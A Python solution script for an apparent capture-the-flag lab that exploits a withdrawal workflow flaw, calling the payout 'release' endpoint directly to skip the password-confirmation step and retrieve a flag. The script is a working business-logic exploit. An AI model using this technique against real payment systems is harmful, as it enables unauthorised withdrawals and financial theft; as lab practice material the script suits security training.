#!/usr/bin/env python3
"""shadyoaks-008 daily - payout state-machine bypass.

The withdrawal (payout) flow is a 3-step sequence:
  1. POST /api/payouts {amount, iban}          -> status "initiated"
  2. POST /api/payouts/:id/confirm {password}  -> status "confirmed"  (password authorisation)
  3. POST /api/payouts/:id/release {}          -> status "released"   (money leaves, balance debited)

The server never enforces that a payout must be "confirmed" before it can be "released".
Calling /release directly on an "initiated" payout skips the password-authorisation step
entirely and completes the withdrawal. On that unauthorised release the server returns the
flag in a `compliance_reference` field.
"""
import json, urllib.request, urllib.error, random, string, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://lab-1789338958808-k6uame.labs-app.bugforge.io"
PW = "TestPass123!"

def req(method, path, data=None, token=None):
    body = json.dumps(data).encode() if data is not None else None
    h = {"Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    r = urllib.request.Request(BASE+path, data=body, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, json.loads(resp.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        b = e.read().decode()
        try: return e.code, json.loads(b)
        except: return e.code, b

def solve():
    u = 'poc_' + ''.join(random.choices(string.ascii_lowercase, k=8))
    s, r = req("POST", "/api/register", {"username": u, "email": f"{u}@test.local", "password": PW})
    token = r["token"]
    # Step 1: initiate a withdrawal
    s, r = req("POST", "/api/payouts", {"amount": 100, "iban": "DE89370400440532013000"}, token=token)
    pid = r["id"]
    # Step 3 directly (skip the confirm step) -> unauthorised release, flag in compliance_reference
    s, r = req("POST", f"/api/payouts/{pid}/release", {}, token=token)
    return r.get("compliance_reference")

if __name__ == "__main__":
    flag = solve()
    if flag:
        print(f"FLAG: {flag}")
    else:
        print("No flag returned - endpoint may be patched or state machine now enforced")
